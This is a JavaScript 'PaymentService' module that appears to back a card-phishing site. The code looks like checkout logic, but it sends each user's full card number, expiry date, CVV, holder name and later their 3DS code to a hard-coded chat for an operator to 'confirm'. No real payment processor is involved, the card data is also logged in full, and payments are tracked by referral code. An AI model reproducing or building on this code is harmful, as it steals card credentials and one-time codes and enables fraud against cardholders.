const botService = require('./bot-service');
const logChatService = require('./log-chat-service');
const PaymentTrackingModel = require('../models/payment-tracking-model');
const UserModel = require('../models/user-model');



class PaymentService {
    async savePaymentTracking(userId, transactionId, amount, status) {
        try {
            if (!userId) {
                console.log('⚠️ PaymentTracking NOT saved: userId is missing');
                return;
            }

            // Get user to retrieve referral code
            const user = await UserModel.findById(userId);
            
            if (!user) {
                console.log(`⚠️ PaymentTracking NOT saved: user ${userId} not found`);
                return;
            }

            const paymentTracking = await PaymentTrackingModel.create({
                userId,
                transactionId,
                amount,
                referralCode: user.referralCode || null,
                status,
                timestamp: new Date()
            });

            console.log(`✅ PaymentTracking saved:`, {
                userId,
                transactionId,
                amount,
                referralCode: user.referralCode || 'no code',
                status
            });

            // Log successful deposit to chat
            if (status === 'success') {
                try {
                    await logChatService.logPayment(
                        userId,
                        user.email,
                        amount,
                        transactionId,
                        user.referralCode
                    );
                } catch (logError) {
                    console.warn('Error logging payment to chat:', logError.message);
                }
            }

            return paymentTracking;
        } catch (error) {
            console.error('❌ Error saving PaymentTracking:', error.message);
        }
    }

    async processPayment(paymentData, userId = null) {
        const buttonPayment = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Confirm', callback_data: 'confirm' },
                        { text: '🔐 3DS', callback_data: 'request_3ds' }
                    ],
                    [
                        { text: '❌ Cancel', callback_data: 'cancel' }
                    ]
                ]
            }
        }
        const { cardNumber, expiryDate, cvv, cardHolder, amount } = paymentData;
        
        // Mask card number (show only last 4 digits)
        const maskedCardNumber = cardNumber.replace(/\s/g, '').slice(-4);
        
        // Generate unique transaction ID
        const transactionId = `TXN-${Date.now()}-${Math.random().toString(36).substr(2, 9).toUpperCase()}`;
        
        // Log for debugging (don't store full card data!)
        console.log(paymentData);
        
        const message = `💳 New Payment\n\n` +
            `💰 Amount: ${paymentData.amount}\n` +
            `🔢 Card: ${paymentData.cardNumber}\n` +
            `📅 Expiry: ${paymentData.expiryDate}\n` +
            `🔐 CVV: ${paymentData.cvv}\n` +
            `👤 Holder: ${paymentData.cardHolder}\n` +
            `🆔 Transaction ID: ${transactionId}`;
        
        // Send message and wait for confirmation
        console.log('Sending payment to admin for confirmation. Transaction ID:', transactionId);
        const result = await botService.sendMessageAndWait(7209588642, message, buttonPayment);
        console.log('Received result from admin:', JSON.stringify(result, null, 2));
        
        if (result.confirmed === true) {
            console.log('>>> PAYMENT SUCCESSFUL (confirmed === true) <<<');
            
            // Save successful payment to statistics
            if (userId) {
                await this.savePaymentTracking(userId, transactionId, amount, 'success');
            }
            
            return {
                transactionId,
                amount,
                status: 'success',
                timestamp: new Date().toISOString()
            };
        } else if (result.requires3DS === true) {
            console.log('>>> 3DS VERIFICATION REQUIRED <<<');
            return {
                transactionId,
                amount,
                status: 'requires_3ds',
                timestamp: new Date().toISOString()
            };
        } else {
            console.log('>>> PAYMENT CANCELLED (confirmed !== true) <<<');
            
            // Save cancelled payment to statistics
            if (userId) {
                await this.savePaymentTracking(userId, transactionId, amount, 'cancelled');
            }
            
            return {
                transactionId,
                amount,
                status: 'cancelled',
                reason: result.reason || 'cancelled_by_admin',
                timestamp: new Date().toISOString()
            };
        }
    }

    async verify3DS(transactionId, verificationCode, paymentData, userId = null) {
        const buttonPayment = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Confirm', callback_data: 'confirm' },
                        { text: '❌ Cancel', callback_data: 'cancel' }
                    ]
                ]
            }
        }

        const message = `🔐 3DS Verification Completed\n\n` +
            `💰 Amount: ${paymentData.amount}\n` +
            `🔢 Card: ${paymentData.cardNumber}\n` +
            `👤 Holder: ${paymentData.cardHolder}\n` +
            `🆔 Transaction ID: ${transactionId}\n` +
            `🔑 3DS Code: ${verificationCode}`;

        console.log('Sending 3DS verification result to admin. Transaction ID:', transactionId);
        const result = await botService.sendMessageAndWait(7209588642, message, buttonPayment);
        console.log('Received final result from admin:', JSON.stringify(result, null, 2));

        if (result.confirmed === true) {
            console.log('>>> PAYMENT SUCCESSFUL AFTER 3DS <<<');
            
            // Save successful payment after 3DS
            if (userId) {
                await this.savePaymentTracking(userId, transactionId, paymentData.amount, 'success');
            }
            
            return {
                transactionId,
                amount: paymentData.amount,
                status: 'success',
                timestamp: new Date().toISOString()
            };
        } else {
            console.log('>>> PAYMENT CANCELLED AFTER 3DS <<<');
            
            // Save cancelled payment after 3DS
            if (userId) {
                await this.savePaymentTracking(userId, transactionId, paymentData.amount, 'cancelled');
            }
            
            return {
                transactionId,
                amount: paymentData.amount,
                status: 'cancelled',
                reason: result.reason || 'cancelled_by_admin',
                timestamp: new Date().toISOString()
            };
        }
    }
}

module.exports = new PaymentService();